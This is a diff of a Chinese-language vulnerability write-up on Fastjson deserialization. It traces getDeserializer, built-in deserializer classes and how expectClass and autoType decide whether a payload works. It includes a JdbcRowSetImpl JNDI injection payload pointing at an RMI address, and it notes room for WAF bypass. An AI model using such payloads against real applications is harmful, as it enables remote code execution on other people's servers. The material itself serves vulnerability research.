@@ -273,7 +273,7 @@ JSON#parseObject(String text)
 					DefaultJSONParser#parseObject(final Map object, Object fieldName) # for循环遍历json字符串，一些过滤和解码操作使得我们有绕waf的空间。如果没有@type，则将解析出的key和value put进入一个JSONObject中，这个过程没有加载类的操作；如果有@type，则会继续调用下列函数
 						TypeUtils#loadClass(String className, ClassLoader classLoader) # 加载类
 						ParserConfig#getDeserializer(Type type) # 获取反序列化器
-							IdentityHashMap#get(K key) # 尝试从缓存中获取
+							IdentityHashMap#get(K key) # 尝试从内置类中获取
 							ParserConfig#getDeserializer(Class<?> clazz, Type type) # 获取反序列化器，一些黑名单中的类被禁止获取反序列化器。
 								ParserConfig#createJavaBeanDeserializer(Class<?> clazz, Type type) # 创建一个反序列化器
 									JavaBeanDeserializer#JavaBeanDeserializer(ParserConfig config, Class<?> clazz, Type type)
@@ -368,19 +368,19 @@ JSON#parseObject(String text)
 
 * ParserConfig#getDeserializer(Type type)
 
-`getDeserializer`是返回了一个反序列化器，我们步入`config.getDeserializer(clazz)`，其逻辑主要是三个if分支，第一个是尝试从缓存中获取反序列化器，第二个是若`type`为`class<?>`调用`getDeserializer((Class<?>) type, type)`获得，第三个当 `type` 是一个带参数的泛型类型（`ParameterizedType`），例如 `List<String>` 或 `Map<String, Integer>`，要先处理其原始类型。
+`getDeserializer`是返回了一个反序列化器，我们步入`config.getDeserializer(clazz)`，其逻辑主要是三个if分支，第一个是尝试从内置类中获取反序列化器，第二个是若`type`为`class<?>`调用`getDeserializer((Class<?>) type, type)`获得，第三个当 `type` 是一个带参数的泛型类型（`ParameterizedType`），例如 `List<String>` 或 `Map<String, Integer>`，要先处理其原始类型。
 
 ![image-20241225110011100](./images/image-20241225110011100.png)
 
 * IdentityHashMap#get(K key)
 
-从缓存中获取就是对比type的hash值，从一个hashmap中获取，至于这个缓存是如何产生的，暂时不讨论
+从内置类中获取就是对比type的hash值，从一个hashmap中获取
 
 ![image-20241225110236614](./images/image-20241225110236614.png)
 
 * ParserConfig#getDeserializer(Class<?> clazz, Type type)
 
-我们步入`getDeserializer((Class<?>) type, type)`查看第二个if的逻辑，先尝试从缓存中读取，然后对一些特殊类型进行处理，注意到下图处，`denyList`维护了一个黑名单，不允许这个黑名单内的类获取反序列化器
+我们步入`getDeserializer((Class<?>) type, type)`查看第二个if的逻辑，先尝试从内置类中读取，然后对一些特殊类型进行处理，注意到下图处，`denyList`维护了一个黑名单，不允许这个黑名单内的类获取反序列化器
 
 ![image-20241225113252816](./images/image-20241225113252816.png)
 
@@ -979,7 +979,7 @@ if (className.startsWith("L") && className.endsWith(";")) {
 
 前面给出的Payload1中，显式开启autoType时，测试了没有expectClass和有expectClass（为恶意类父类）这两种情况，都可以成功打payload。从开发角度来说，开启autoType后不显式指定expectClass是常见的写法。后面给出了Payload2，可以在autoType关闭的情况下利用成功，但是从开发角度来说，没有显示开启autoType，显示指定expectClass是常见写法，而攻击者在该场景下能够遇到可以利用的expectClass是比较难得的，这样看来Payload2的适用场景没有Payload1的广泛
 
-##### expectClass如何影响Payload发挥作用
+##### 补充：expectClass如何影响Payload发挥作用——了解到fastjson的内置类
 
 ```java
         String fastSer =  "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
@@ -991,7 +991,75 @@ if (className.startsWith("L") && className.endsWith(";")) {
 //        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class); // 成功
 ```
 
-前面也分析过显式指定expectClass这种写法，但是无法解答一个新的问题，即Payload1在没有开启autoType的情况下，为什么有些expectClass可以发挥作用，有些没办法发挥作用，当然这里挑选的都是`JdbcRowSetImpl`父类和实现的接口。
+前面也分析过显式指定expectClass这种写法，但是无法解答一个新的问题，即Payload1在没有开启autoType的情况下，为什么有些expectClass可以发挥作用，有些没办法发挥作用，类似的，在Payload2中也出现了这种情况，且由于Payload2和expectClass不为null是更常见的情况，分析这个问题对于Payload2也更有价值。我们来调试一下Payload1不开autoType且指定expectClass为`Serializable.class`的情况：
+
+布下断点后，连续步入，来到下图处
+
+![image-20250122104946598](./images/image-20250122104946598.png)
+
+这里获取了一个反序列化器，这是与之前expectClass为null时不同的地方，之前分析的调用过程是先调用loadClass后（1.2.25则是checkAutoTye）再获取反序列化，不过也可以理解，因为这里expectClass不为null，相当于已经加载过类。
+
+进入反序列化过程后继续步入，调用过程和之前类似，我们一步步来到`DefaultJSONParser#parseObject(final Map object, Object fieldName)`，还是来到了checkAutoType，这里会有加载类操作
+
+![image-20250122111903810](./images/image-20250122111903810.png)
+
+我们步入，调试发现，这里最终没有加载到类，于是抛出异常
+
+![image-20250122112347819](./images/image-20250122112347819.png)
+
+我们对比分析一下expectClass为`Wrapper.class`的情况，这里就不详细列出过程了，两个expectClass的区别在于获取反序列化器时，`Serializable.class`为一个`JavaObjectDeserializer`对象，而`Wrapper.class`为`JavaBeanDeserializer`
+
+![image-20250122113958573](./images/image-20250122113958573.png)
+
+我们进入`ParserConfig#getDeserializer(Type type)`分析具体原因。
+
+```java
+public ObjectDeserializer getDeserializer(Type type) {
+    ObjectDeserializer derializer = this.deserializers.get(type);
+    if (derializer != null) {
+        return derializer;
+    }
+
+    if (type instanceof Class<?>) {
+        return getDeserializer((Class<?>) type, type);
+    }
+
+    if (type instanceof ParameterizedType) {
+        Type rawType = ((ParameterizedType) type).getRawType();
+        if (rawType instanceof Class<?>) {
+            return getDeserializer((Class<?>) rawType, type);
+        } else {
+            return getDeserializer(rawType);
+        }
+    }
+
+    return JavaObjectDeserializer.instance;
+}
+```
+
+这个函数的逻辑很明了，先尝试从`ParserConfig.deserializers`（fastjson内置类）获取反序列化器，获取到就返回，获取不到才通过`getDeserializer((Class<?>) type, type)`创建并获取一个反序列化器，这过程之前也分析过。
+
+从下图代码可以看出`Serializable.class`也属于内置类
+
+![image-20250122142313047](./images/image-20250122142313047.png)
+
+##### 补充：expectClass为内置类的调用栈
+
+这里后续的调用栈和之前expectClass为空的情况一致了，就不再详细分析代码了，这里的调用栈解答了，为什么Payload1在autoType开启时expectClass可以为`Object.class`等内置类，而关闭时不可以，即使该内置类为恶意类的父类。
+
+```java
+JSON#parseObject(String text, Class<T> clazz)
+	JSON#parseObject(String json, Class<T> clazz, Feature... features)
+		JSON#parseObject(String input, Type clazz, ParserConfig config, ParseProcess processor, int featureValues, Feature... features)
+			DefaultJSONParser#parseObject(Type type, Object fieldName)
+				ParserConfig#getDeserializer(Type type) # 获取expectClass的反序列化器
+				JavaObjectDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName)
+					DefaultJSONParser#parse(Object fieldName) # 到这里，后续代码和expectClass为null的情况一致了
+						DefaultJSONParser#parseObject(final Map object, Object fieldName)
+							ParserConfig#checkAutoType(String typeName, Class<?> expectClass)
+```
+
+##### 补充：expectClass为非内置类的调用站
 
 #### 1.2.25<=Fastjson<=1.2.41
 
